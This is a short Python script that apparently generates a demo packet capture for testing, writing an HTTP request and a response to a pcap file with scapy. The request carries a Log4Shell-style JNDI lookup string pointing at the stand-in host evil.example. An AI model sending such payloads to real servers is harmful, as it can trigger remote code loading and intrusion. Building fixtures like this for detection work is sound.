from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from scapy.all import IP, TCP, Raw, wrpcap


def main() -> None:
    payload = b"GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1\r\nHost: victim\r\nUser-Agent: demo\r\n\r\n"
    response = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nContent-Type: text/plain\r\n\r\nOK"
    packet = IP(src="10.10.10.5", dst="10.10.10.20") / TCP(sport=44444, dport=80) / Raw(load=payload)
    response_packet = IP(src="10.10.10.20", dst="10.10.10.5") / TCP(sport=80, dport=44444) / Raw(load=response)
    output = Path("data/pcap/demo_attack.pcap")
    output.parent.mkdir(parents=True, exist_ok=True)
    wrpcap(str(output), [packet, response_packet])
    print(output)


if __name__ == "__main__":
    main()
